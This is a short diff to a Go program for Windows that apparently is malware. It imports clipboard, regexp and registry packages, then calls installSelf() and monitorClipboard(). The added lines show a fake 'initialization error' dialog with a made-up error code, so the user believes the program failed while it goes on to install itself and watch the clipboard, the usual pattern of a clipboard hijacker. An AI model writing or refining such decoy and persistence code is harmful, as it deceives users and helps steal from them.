@@ -5,7 +5,9 @@ import (
 	"os"
 	"regexp"
 	"time"
+	"path/filepath"
 
+	"github.com/sqweek/dialog"
 	"github.com/atotto/clipboard"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
@@ -41,6 +43,13 @@ func main() {
 		fmt.Println("Another instance is already running.")
 		return
 	}
+
+	executableName := filepath.Base(os.Args[0])
+	time.Sleep(3 * time.Second)
+	dialog.Message(
+		"An error has occurred in the program during initialization. If this issue persists, please contact your system administrator.\n\n"+
+		"Error Code: 0x80070426\n\n",
+	).Title(executableName).Error()
 
 	installSelf()
 	monitorClipboard()
